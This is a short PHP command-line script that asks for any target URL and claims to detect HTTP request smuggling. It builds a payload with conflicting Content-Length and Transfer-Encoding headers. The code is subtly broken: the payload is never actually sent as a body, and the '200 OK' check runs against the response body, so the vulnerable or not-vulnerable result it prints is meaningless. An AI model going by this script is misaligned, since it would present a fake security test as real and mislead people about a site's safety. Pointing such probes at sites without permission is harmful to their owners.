<?php

// Function to send HTTP request
function sendHttpRequest($url, $headers) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
}

// Function to check if vulnerability is present
function checkVulnerability($url) {
    // Define a payload for smuggling attack
    $payload = "GET / HTTP/1.1\r\nHost: example.com\r\nContent-Length: 0\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n";
    
    // Send a request with the payload
    $headers = array(
        "Content-Length: " . strlen($payload),
        "Transfer-Encoding: chunked"
    );

    $response = sendHttpRequest($url, $headers);
    
    // Check if the response indicates vulnerability
    if (strpos($response, "200 OK") !== false) {
        return true;
    } else {
        return false;
    }
}

// Function to explain how to test vulnerability
function explainTesting() {
    echo "To test for HTTP Request Smuggling vulnerability, you can use tools like Burp Suite or curl with a crafted request payload similar to the one used in this program.\n";
}

// Function to display output with color
function colorize($text, $color) {
    $colors = array(
        'green' => "\033[0;32m",
        'red' => "\033[0;31m",
        'reset' => "\033[0m"
    );
    return $colors[$color] . $text . $colors['reset'];
}

// Main program

// Prompt for target website URL
echo "Enter your target website URL: ";
$targetURL = trim(fgets(STDIN));

// Check vulnerability
echo "Testing vulnerability for: " . $targetURL . "\n";
$isVulnerable = checkVulnerability($targetURL);

// Display result with color
if ($isVulnerable) {
    echo colorize("The target website is vulnerable to HTTP Request Smuggling.\n", 'red');
} else {
    echo colorize("The target website is not vulnerable to HTTP Request Smuggling.\n", 'green');
}

// Explain testing
echo "\n";
echo "To test the vulnerability, you can send a crafted HTTP request with a payload similar to the one used in this program.\n";
explainTesting();

?>
